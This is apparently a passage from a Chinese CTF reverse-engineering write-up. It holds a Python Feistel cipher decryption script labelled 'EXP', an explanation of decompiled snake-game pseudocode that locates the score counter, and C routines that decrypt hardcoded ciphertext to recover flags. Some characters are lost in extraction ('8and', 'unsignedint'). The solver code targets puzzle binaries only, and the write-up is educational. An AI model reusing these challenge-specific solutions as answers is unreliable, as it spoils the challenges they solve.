        if padding_len <= 8and all(b == padding_len for b in result[-padding_len:]):
            result = result[:-padding_len]

    return bytes(result)

def main():
    """主函数 - 演示加密解密过程"""
    print("🔐 Feistel密码 完整EXP")
    print("=" * 50)

    # 测试1: 单个8字节块
    print("n1️⃣ 单块测试")
    test_input = b"09876543"
    print(f"明文: {test_input}")
    print(f"明文(hex): {test_input.hex()}")

    # 加密
    encrypted = feistel_encrypt(test_input)
    print(f"密文(hex): {encrypted.hex()}")

    # 解密
    decrypted = feistel_decrypt(encrypted)
    print(f"解密结果: {decrypted}")
    print(f"解密(hex): {decrypted.hex()}")
    print(f"解密成功: {test_input == decrypted}")

    # 测试2: 给定的密文解密
    print("n2️⃣ 已知密文解密")
    cipher_hex = "1BBBA1F2E97C87218A37FD0A941A81BC401EE3AA732ED83F84B87142CC358B39"
    cipher_bytes = bytearray.fromhex(cipher_hex)
    print(f"密文(hex): {cipher_hex}")

    # 解密多个块
    decrypted_result = decrypt_multiple_blocks(cipher_bytes)
    print(f"解密结果: {decrypted_result}")
    print(f"解密(hex): {decrypted_result.hex()}")

    # 尝试解析为ASCII
    try:
        ascii_result = decrypted_result.decode('ascii', errors='ignore')
        print(f"ASCII解析: '{ascii_result}'")
    except:
        print("无法解析为ASCII")

    # 测试3: 长文本加密解密
    print("n3️⃣ 长文本测试")
    long_text = b"Hello, this is a test message for Feistel cipher!"
    print(f"原文: {long_text}")

    # 加密
    encrypted_long = encrypt_multiple_blocks(long_text)
    print(f"加密后(hex): {encrypted_long.hex()}")

    # 解密
    decrypted_long = decrypt_multiple_blocks(encrypted_long)
    print(f"解密后: {decrypted_long}")
    print(f"长文本解密成功: {long_text == decrypted_long}")

def crack_known_plaintext(known_pairs):
    """
    已知明文攻击 - 如果有明文密文对，可以验证S盒
    """
    print("n🎯 已知明文攻击验证")
    for plaintext, ciphertext in known_pairs:
        calculated_cipher = feistel_encrypt(plaintext)
        match = calculated_cipher == ciphertext
        print(f"明文: {plaintext.hex()}")
        print(f"期望密文: {ciphertext.hex()}")
        print(f"计算密文: {calculated_cipher.hex()}")
        print(f"匹配: {match}")
        print("-" * 30)

def analyze_sbox():
    """分析S盒特性"""
    print("n🔬 S盒分析")
    print(f"S盒长度: {len(sbox)}")
    print(f"S盒前8个值: {[hex(x) for x in sbox[:8]]}")

    # 检查重复值
    unique_count = len(set(sbox))
    print(f"唯一值数量: {unique_count}/{len(sbox)}")

    # 检查值的分布
    avg_val = sum(sbox) / len(sbox)
    print(f"平均值: {avg_val:.0f} (0x{int(avg_val):08x})")

if __name__ == "__main__":
    main()
    analyze_sbox()

    # 如果有已知的明文密文对，可以用这个函数验证
    # known_pairs = [(b"testdata", bytearray.fromhex("..."))]
    # crack_known_plaintext(known_pairs)
```



```
好的，我们来分析这段来自CTF逆向工程（Reverse Engineering）挑战的伪代码。这看起来像是用IDA Pro之类的工具从一个用Go语言编写的贪吃蛇游戏中反编译出来的C伪代码。

代码的核心逻辑是，flag并不是在满足某个特定条件（比如分数达到100）时才显示，而是在每次吃到食物时，都会被“解密”一次。 你需要正确地进行游戏，才能在最后得到完全解密的flag。

下面我为你分步解析关键部分：

1. 关键数据结构
首先，要理解几个重要的变量，它们很可能是指向游戏核心数据结构的指针：

v11 (或 v79): 指向一个主游戏状态的结构体。这个结构体里包含了游戏板的尺寸、加密密钥、加密的flag等信息。
v25 (或 v80): 指向代表蛇身体的结构体（在Go中通常是“切片”或slice）。这个结构体里包含了蛇的坐标、长度，以及我们最关心的分数。
2. Score（分数）的关键项
我们来定位分数是如何增加的。请看这部分代码：

复制
// ...
v51 = *(_QWORD **)(v11 + 8);
if ( *v51 == v49 && v51[1] == n3 )
{
  ++*(_QWORD *)(v25 + 32); // <--- 分数增加在这里！
  // ...
}
// ...
分析:

if ( *v51 == v49 && v51[1] == n3 ): 这是一个条件判断。v51 指向的是蛇头的坐标，而 v49 和 n3 是食物的坐标。这个 if 语句的作用就是判断蛇头是否碰到了食物。
++*(_QWORD *)(v25 + 32);: 如果蛇吃到了食物，这行代码就会执行。它将 v25 指针偏移 32 字节位置的值加一。
结论: 分数（Score）就存储在 v25 所指向的蛇结构体偏移 32 字节的位置。每次吃到食物，这个值就会 +1。
```



```
void decrypt(uint32_t* v, uint32_t* k, int round) {
    uint32_t delta = 0x11223344;                     /* a key schedule constant */

    uint32_t v0 = v[0], v1 = v[1], sum = round* delta, i;  /* set up */
    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];   /* cache key */
    for (i = 0; i < round; i++) {                         /* basic cycle start */
        v1 -= ((v0 << 2) + k2) ^ (v0 + sum+ 0xabcdef01) ^ ((v0 >> 5) + k3);
        sum -= delta;
        v0 -= ((v1 << 3) + k0) ^ (v1 + sum) ^ ((v1 >> 4) + k1);
    }                                              /* end cycle */
    v[0] = v0; v[1] = v1;

    v0 = v[2], v1 = v[3], sum = round * delta*2;
    for (i = 0; i < round; i++) {                         /* basic cycle start */
        v1 -= ((v0 << 2) + k2) ^ (v0 + sum + 0xabcdef01) ^ ((v0 >> 5) + k3);
        sum -= delta;
        v0 -= ((v1 << 3) + k0) ^ (v1 + sum) ^ ((v1 >> 4) + k1);
    }
    v[2] = v0; v[3] = v1;

    v0 = v[4], v1 = v[5], sum = round * delta * 3;
    for (i = 0; i < round; i++) {                         /* basic cycle start */
        v1 -= ((v0 << 2) + k2) ^ (v0 + sum + 0xabcdef01) ^ ((v0 >> 5) + k3);
        sum -= delta;
        v0 -= ((v1 << 3) + k0) ^ (v1 + sum) ^ ((v1 >> 4) + k1);
    }
    v[4] = v0; v[5] = v1;

    v0 = v[6], v1 = v[7], sum = round * delta * 4;
    for (i = 0; i < round; i++) {                         /* basic cycle start */
        v1 -= ((v0 << 2) + k2) ^ (v0 + sum + 0xabcdef01) ^ ((v0 >> 5) + k3);
        sum -= delta;
        v0 -= ((v1 << 3) + k0) ^ (v1 + sum) ^ ((v1 >> 4) + k1);
    }
    v[6] = v0; v[7] = v1;

}
int main() {
    uint32_t v9[9]; // [rsp+20h] [rbp-30h]
    v9[0] = 0x877A62A6;
    v9[1] = 1784017395;
    v9[2] = 0xAE194847;
    v9[3] = 0xB1E643E7;
    v9[4] = 0xA94FE881;
    v9[5] = 0x9BC8A28A;
    v9[6] = 0xC4CFAA9F;
    v9[7] = 0xF1A00CA1;
    v9[8] = 0;
    unsignedint key[] = { 0xa56babcd,0xffffffff,0xffffffff,0xa56babcd };
    decrypt((uint32_t*)v9, key, 64);
    char* flag = (char*)v9;
    printf("%s", v9);
}
```



```
unsigned short encccc[] = { 243,130,6,509,336,56,178,222,346,407,156,471,110,40,326,151 };
    for (int i = 0; i < 16; i++) {
        encccc[i] -= 20;
    }
    unsigned short keyyy[] = { 176,200,250,134,110,143,175,191,201,100,215,195,227,239,135 };
    unsignedint op[] = { 1,0,0,1,1,0,1,1,1,1,1,1,0,0,1,0 };
    for (int i = 1; i <16; i++) {
        if (op[i] == 0) {
            encccc[i] = keyyy[i - 1] - encccc[i];
        }
        else {
            encccc[i] = encccc[i]- keyyy[i - 1];
        }
        encccc[i] ^= encccc[i - 1];
    }

    for (int i = 0; i < 16; i++) {
        printf("%x", encccc[i]);
    }
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752894680-wxsync-2025-07-3100973bb24fc99ea38dbc6dc5b53718.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752894682-wxsync-2025-07-d6209ea01c70f6555137f574d1316363.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752894684-wxsync-2025-07-139d79255bb0b945edfaceb31694b58d.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752894687-wxsync-2025-07-7445b2c32f36c09eb482c122ed530f60.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752894690-wxsync-2025-07-8ea30b203027b2d558b96c0b29071029.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752894692-wxsync-2025-07-4c817c2bd3f8f7fbdc0496150deb8fb9.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752894694-wxsync-2025-07-852d74255c01f9e270c0946362015e12.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752894697-wxsync-2025-07-9c18acd03aaa1ca96f88c569d7463d77.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752894699-wxsync-2025-07-6d98068e1b86d075c699b9480649b29a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752894701-wxsync-2025-07-0c604a025e7938f3d9b668fcab31b149.png)